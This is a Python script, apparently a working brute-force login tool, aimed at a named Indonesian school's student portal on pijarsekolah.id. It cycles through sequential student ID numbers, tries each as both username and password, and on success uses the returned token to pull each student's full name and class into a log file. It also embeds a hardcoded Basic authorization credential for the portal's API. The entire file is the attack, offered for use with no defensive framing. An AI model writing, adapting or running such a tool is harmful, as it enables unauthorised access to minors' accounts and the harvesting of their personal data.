import requests
import json
import time
import random
from datetime import datetime
import sys
import threading

# Colors for console output
class Colors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    RESET = '\033[0m'

# Files to log successful logins and cache attempts
log_file = "logs.txt"
cache_file = "cache.txt"

# Headers for login request
login_headers = {
    'Accept': 'application/json, text/plain, */*',
    'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
    'Authorization': 'Basic cGlqYXJza2xoOmJkMjdmM2E5LTk1Y2MtNDdlMS04Y2IzLTBkYmY2NjVhMWYzOQ==',
    'Connection': 'keep-alive',
    'Content-Type': 'application/json',
    'Origin': 'https://siswa.pijarsekolah.id',
    'Referer': 'https://siswa.pijarsekolah.id/',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-site',
    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"'
}

# Headers for status request (token will be added later)
status_headers = {
    'Accept': 'application/json, text/plain, */*',
    'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
    'Connection': 'keep-alive',
    'Origin': 'https://siswa.pijarsekolah.id',
    'Referer': 'https://siswa.pijarsekolah.id/',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-site',
    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"'
}

# URLs
login_url = 'https://auth-api.pijarsekolah.id/student/login'
status_url = 'https://auth-api.pijarsekolah.id/student/status'

# Global flag to control the bruteforce loop
running = True

# Function to try login with a specific NISN
def try_login(nisn):
    # Create login payload
    payload = {
        "username": nisn,
        "password": nisn,  # Password same as username
        "remember": False,
        "school": "https://siswa.pijarsekolah.id/sman3pati"
    }
    
    try:
        # Send login request
        response = requests.post(login_url, headers=login_headers, json=payload)
        
        # Check if login was successful
        if response.status_code == 200:
            data = response.json()
            if data.get('success') == True and 'data' in data and 'token' in data['data']:
                print(f"{Colors.GREEN}>> Login to [{nisn}], Status: Success{Colors.RESET}")
                return data['data']['token']
            else:
                print(f"{Colors.RED}>> Login to [{nisn}], Status: Failed (Invalid credentials){Colors.RESET}")
        else:
            print(f"{Colors.RED}>> Login to [{nisn}], Status: Failed (HTTP {response.status_code}){Colors.RESET}")
        
        return None
    except Exception as e:
        print(f"{Colors.RED}>> Login to [{nisn}], Status: Failed (Error: {str(e)}){Colors.RESET}")
        return None

# Function to get user status using the token
def get_user_status(token):
    try:
        # Add token to headers
        headers_with_token = status_headers.copy()
        headers_with_token['Authorization'] = f'Bearer {token}'
        
        # Send status request
        response = requests.get(status_url, headers=headers_with_token)
        
        # Check if status request was successful
        if response.status_code == 200:
            return response.json()
        else:
            print(f"{Colors.RED}>> Status request failed: HTTP {response.status_code}{Colors.RESET}")
        
        return None
    except Exception as e:
        print(f"{Colors.RED}>> Error during status request: {str(e)}{Colors.RESET}")
        return None

# Function to log successful login details
def log_success(nisn, class_name, full_name):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open(log_file, 'a') as f:
        f.write(f"[{timestamp}] [{class_name}] [{full_name}] : [{nisn}]\n")
    print(f"{Colors.GREEN}>> User details logged to {log_file}{Colors.RESET}")

# Function to log attempt to cache
def log_attempt(attempt_number, nisn):
    with open(cache_file, 'a') as f:
        f.write(f"[{attempt_number}] {nisn}\n")

# Function to listen for exit command
def exit_listener():
    global running
    while running:
        command = input().strip().lower()
        if command == "exit":
            print(f"{Colors.YELLOW}>> Exiting bruteforce script...{Colors.RESET}")
            running = False
            break

# Main function to run the brute force attack
def main():
    global running
    
    start_nisn = 89600042  # Starting NISN
    end_nisn = 89600050    # Ending NISN
    
    print(f"{Colors.BLUE}[*] Starting brute force attack from {start_nisn} to {end_nisn}{Colors.RESET}")
    print(f"{Colors.BLUE}[*] Results will be logged to {log_file}{Colors.RESET}")
    print(f"{Colors.BLUE}[*] Attempts will be cached in {cache_file}{Colors.RESET}")
    print(f"{Colors.YELLOW}[*] Type 'exit' at any time to stop the script{Colors.RESET}")
    print(f"{Colors.BLUE}[*] Processing speed: ~10 NISN per second (100ms delay){Colors.RESET}")
    
    # Create or clear the log file
    with open(log_file, 'w') as f:
        f.write(f"# Brute Force Results - {datetime.now()}\n")
    
    # Create or clear the cache file
    with open(cache_file, 'w') as f:
        f.write(f"# Brute Force Attempts - {datetime.now()}\n")
    
    # Start the exit listener in a separate thread
    exit_thread = threading.Thread(target=exit_listener)
    exit_thread.daemon = True
    exit_thread.start()
    
    attempts = 0
    successful = 0
    failed = 0
    
    # Start the brute force loop
    for i in range(start_nisn, end_nisn + 1):
        if not running:
            break
            
        nisn = f"00{i}"
        attempts += 1
        
        print(f"{Colors.CYAN}>> Attempting login for NISN: {nisn} (Attempt #{attempts}){Colors.RESET}")
        
        # Log attempt to cache file
        log_attempt(attempts, nisn)
        
        # Try login
        token = try_login(nisn)
        
        # If login successful, get user status
        if token:
            successful += 1
            status_data = get_user_status(token)
            
            # If status request successful, log the details
            if status_data and status_data.get('success') == True and 'data' in status_data:
                user_data = status_data['data']
                class_name = user_data.get('className', 'Unknown')
                full_name = user_data.get('fullName', 'Unknown')
                
                print(f"{Colors.GREEN}>> Found user: {full_name}, Class: {class_name}, NISN: {nisn}{Colors.RESET}")
                log_success(nisn, class_name, full_name)
            else:
                print(f"{Colors.RED}>> Failed to get user status for NISN: {nisn}{Colors.RESET}")
        else:
            failed += 1
        
        # Use 100ms delay (0.1 seconds) to process ~10 NISN per second
        time.sleep(0.1)
    
    print(f"{Colors.MAGENTA}[*] Bruteforce completed or stopped{Colors.RESET}")
    print(f"{Colors.MAGENTA}[*] Attempts: {attempts}, Successful: {successful}, Failed: {failed}{Colors.RESET}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"{Colors.YELLOW}>> Script interrupted by user. Exiting...{Colors.RESET}")
        sys.exit(0)
